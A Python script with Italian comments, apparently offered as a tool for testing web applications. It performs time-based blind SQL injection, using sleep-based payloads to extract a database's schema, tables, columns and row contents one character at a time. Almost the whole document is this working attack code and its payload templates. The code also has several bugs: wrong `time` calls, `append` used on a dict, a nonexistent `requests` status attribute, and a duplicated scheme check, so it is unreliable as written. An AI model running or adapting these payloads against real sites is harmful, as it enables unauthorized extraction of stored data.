'''
    Autore: Alessandro Vettor
    Data e Ora: Mercoledì 1 Settembre 2021 21:50
'''
import requests
from time import time


class SQLi:
    def __init__(self, url='localhost', path="/", query='', method='get', characters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_=^') -> object:
        self.characters = characters
        if url.startswith("http://") or url.startswith("http://"):
            self.url = url
        else:
            self.url = "{0}{1}{2}?{3}=".format("http://", url, path, query)
        self.method = method
        self.schema = ''
        self.tables = []
        if self.verify_url():
            self.session = requests.Session()
        else:
            print(
                "Controlla di aver inserito correttamente sia l'indirizzo sia il percorso")
            exit()

    def verify_url(self) -> bool:
        if self.method == "get":
            if requests.get(self.url).status < 300:
                return True
        else:
            if self.method == "post":
                if requests.get(self.url).status < 300:
                    return True
        return False

    def get_TableSchema(self, esclude = '') -> str:
        result = {}
        flag = True
        while flag:
            for char in self.characters:
                if char == '^':
                    flag = False
                    break
                ti = time.time()
                payload = f"' and (select sleep(0.5) from information_schema.schemata where table_schema like '{''.join(e for e in result)}{char}%')='1"
                self.queryExec(payload)
                tf = time.time()
                if (tf - ti) >= 0.5:
                    if f'{"".join(e for e in result)}{char}'[0] not in esclude:
                        result.append(char)
        if len(result) > 0:
            self.schema = "".join(e for e in result)
            return self.schema
        else:
            return "Non è stato possibile ricavare lo schema"

    def get_value(self, payload, esclude = '') -> str:
        result = {}
        flag = True
        _1, _2 = payload.split("$")
        while flag:
            for char in self.characters:
                if char == '^':
                    flag = False
                    break
                ti = time.time()
                self.queryExec(f"{_1}{''.join(e for e in result)}{char}{_2}")
                tf = time.time()
                if (tf - ti) >= 0.5:
                    if f'{"".join(e for e in result)}{char}'[0] not in esclude:
                        result.append(char)
        if len(result) > 0:
            return "".join(e for e in result)
        else:
            return "Controlla che il payload sia stato costruito correttamente"

    def queryExec(self, payload) -> None:
        if self.method == "get":
            self.session.get("{0}{1}".format(self.url, payload))
        else:
            self.session.post("{0}{1}".format(self.url, payload))

    def get_schema(self) -> str:
        return self.schema



def main():
    NUMERO_COLONNE_IN_PIU = 0
    sqli = SQLi("url", "/", "data", "get")

    '''
        Grazie alla funzione get_TableSchema possiamo ricavare lo schema delle tabelle. Di solito è
        il nome del database
    '''
    sqli.get_TableSchema("")

    '''
       Dopo aver ricavato lo schema delle tabelle possiamo ricavare il nome delle tabelle che contiene.
       Qui sotto un payload di esempio:
    '''
    # è necessario inserire il $ per indicare il posto in cui dovranno essere inseriti i caratteri da provare (massimo 1)
    payload = f"' and (select sleep(0.5){''.join(',null' for _ in range(NUMERO_COLONNE_IN_PIU))} from information_schema.tables where table_name like '$%' and table_schema='{sqli.get_schema()}')='1"
    # per evitare di ricavare più volte lo stesso valore, bisogna valorizzare il secondo parametro con i caratteri iniziali che si vogliono escludere
    print(sqli.get_value(payload, ""))
    exit()

    '''
       Dopo aver ricavato il nome della tabella possiamo ricavare il nome delle colonne che contiene.
       Qui sotto un payload di esempio:
    '''
    # valoriziamo NOME_TABELLA con la stringa ricavata dal passaggio precedente
    NOME_TABELLA = 'esempio'
    payload = f"' and (select sleep(0.5){''.join(',null' for _ in range(NUMERO_COLONNE_IN_PIU))} from information_schema.columns where column_name like '$%' and table_name='{NOME_TABELLA}')='1"
    print(sqli.get_value(payload, ""))

    #exit()

    '''
       Dopo aver ricavato il nome di una o più colonne possiamo ricavare il valore che contiene ciascuna.
       In questo caso ci tornerà la prima riga della tabella
       Qui sotto un payload di esempio:
    '''
    # valoriziamo COLONNE con le stringhe ricavate dal passaggio precedente
    COLONNE = ['colonna1', 'colonna2', 'colonna3']
    for colonna in COLONNE:
        # ovviamente possiamo modificare il payload, ad esempio aggiungere un 'and id=' in un ciclo con un range
        # che parte da 1 fino a 100
        payload = f"' and (select sleep(0.5){''.join(',null' for _ in range(NUMERO_COLONNE_IN_PIU))} from {NOME_TABELLA} where {colonna} like '$%')='1"
        print(sqli.get_value(payload, ""))

    #exit()

if __name__ == '__main__':
    main()

'''
Conclusioni:
    Il metodo utilizzato in questo tool si chiama sql time injection:
        nel caso in cui la query venisse eseguita con successo impiegherà 0.5 secondi per ritornare una risposta,
        la pausa equivale alla conferma.
    Nel caso in cui tornasse un errore di query che spiega che il numero delle colonne della seconda query
    non è uguale al numero delle colonne della prima basterà provare a indovinare cambiando il valore di NUMERO_COLONNE_IN_PIU
    es: 
        NUMERO_COLONNE_IN_PIU = 2
        payload = " ... sleep(0.5),null,null ... "
        
    Spero possa servirvi per testare le vostre applicazioni web
'''